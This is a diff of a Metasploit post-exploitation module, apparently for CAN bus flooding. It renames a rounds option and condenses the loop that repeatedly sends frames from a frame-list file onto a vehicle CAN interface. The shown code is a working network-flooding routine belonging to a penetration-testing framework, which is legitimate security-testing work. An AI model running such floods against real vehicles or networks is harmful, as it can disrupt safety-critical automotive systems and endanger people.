@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptInt.new('ROUND_NUMBER', [false, 'Number of executed rounds', 200]),
+        OptInt.new('ROUNDS', [false, 'Number of executed rounds', 200]),
         OptString.new('CANBUS', [false, 'CAN interface', nil]),
         OptString.new('FRAMELIST', [true, 'Path to FRAMELIST', ::File.join(Msf::Config.data_directory, 'wordlists', 'frameListCanBus.txt')])
       ]
@@ -30,13 +30,10 @@ class MetasploitModule < Msf::Post
       print_error "Frame list file '#{datastore['FRAMELIST']}' does not exist"
       return
     end
-    lines = File.readlines(datastore['FRAMELIST']).map { |line| line.strip }
+    frames = File.readlines(datastore['FRAMELIST']).map { |line| line.strip.split('+') }
     print_status(' -- FLOODING -- ')
-    (datastore['ROUND_NUMBER']).times do
-      lines.each do |line|
-        frame = line.split('+')
-        client.automotive.cansend(datastore['CANBUS'], frame[0], frame[1])
-      end
+    datastore['ROUNDS'].times do
+      frames.each_index { |i| client.automotive.cansend(datastore['CANBUS'], frames[i][0], frames[i][1]) }
     end
   end
 end
